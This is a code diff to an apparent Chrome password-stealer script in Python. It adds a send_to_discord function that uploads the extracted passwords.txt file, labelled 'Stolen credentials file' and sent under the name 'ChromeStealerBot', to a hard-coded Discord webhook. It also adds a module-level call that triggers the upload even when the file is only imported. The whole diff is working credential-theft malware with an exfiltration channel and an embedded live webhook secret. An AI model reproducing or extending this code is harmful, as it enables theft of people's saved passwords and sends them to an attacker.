@@ -7,7 +7,7 @@ import ctypes
 import shutil
 import sqlite3
 
-
+import requests
 
 
 def get_aes():
@@ -100,7 +100,27 @@ def extract_passwords_from_profiles():
     with open("passwords.txt", "w", encoding="utf-8") as f:
         f.write("\n".join(output_lines))
 
-  
+
+
+def send_to_discord(file_path, webhook_url):
+    with open(file_path, "rb") as f:
+        payload = {
+            "content": "Stolen credentials file",
+            "username": "ChromeStealerBot"
+        }
+        files = {
+            "file": (os.path.basename(file_path), f)
+        }
+        response = requests.post(webhook_url, data=payload, files=files)
+
+    if response.status_code == 204:
+        print("✅ File sent successfully.")
+    else:
+        print(f"❌ Failed to send: {response.status_code}")
+
+
+
+
 
 '''
 def extract_passwords_from_profiles():
@@ -121,8 +141,14 @@ def extract_passwords_from_profiles():
 
 
 '''
+
+
+
 if __name__ == "__main__":
     extract_passwords_from_profiles()
+
+
+send_to_discord("passwords.txt", "https://discord.com/api/webhooks/1401270561782501477/s1TSaeTOk8RuHhM4WDQRse8LSUjt4IA-zMgXOL1Y-r16ApgAN72mDczE5eKYBWnwUvuR")
 
 
 '''key = get_aes()
